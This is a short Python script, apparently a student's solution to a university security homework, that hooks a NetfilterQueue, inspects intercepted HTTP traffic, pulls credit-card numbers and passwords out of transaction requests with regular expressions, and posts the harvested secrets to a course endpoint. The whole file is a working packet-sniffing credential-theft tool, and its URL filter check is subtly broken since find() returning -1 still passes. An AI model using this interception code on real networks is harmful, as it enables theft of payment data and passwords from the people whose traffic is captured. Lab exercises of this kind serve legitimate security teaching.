from netfilterqueue import NetfilterQueue
from scapy.layers.inet import IP, TCP, Raw
import json
import requests
import sys
import re

secrets = set()

def print_and_accept(pkt):
    global secrets
    #print(pkt)
    #print(pkt.get_payload())
    ip = IP(pkt.get_payload())
    cc = "[0-9A-Za-z]* (cc --- ([0-9]{4}[./][0-9]{4}[./][0-9]{4}[/.][0-9]{4})) [0-9A-Za-z]"
    pwd = "[0-9A-Za-z] (pwd --- ([A-Z0-9:;<=>?@]*)) [0-9A-Za-z]"
    print(secrets)
    if len(secrets) == 5:
        print("done, sending request")
        data = {
            "student_email": "cosmin.rusu@epfl.ch",
            "secrets": list(secrets),
        } 
        print(data)
        r = requests.post("http://com402.epfl.ch/hw1/ex4/sensitive", json=data)
        print(r.text)
        sys.exit()
    else: 
        if (ip.haslayer(Raw)):
            if (ip.haslayer(TCP) and ip[TCP].dport == 80):
                http = ip[TCP].load.decode()
                print("Http received")
                if http.find("com402.epfl.ch/hw1/ex4/transaction"):
                    print("Transaction http received")
                    m = re.search(cc, http)
                    if m:
                        print("Found CC", m.group(2))
                        secrets.add(m.group(2))
                    m = re.search(pwd, http)
                    if m:
                        print("Found PASSWORD", m.group(2))
                        secrets.add(m.group(2))
    pkt.accept()

print("Starting queue")
nfqueue = NetfilterQueue()
nfqueue.bind(0, print_and_accept, 100)
try:
    print("Running queue")
    nfqueue.run()
except KeyboardInterrupt:
    print('')

nfqueue.unbind()
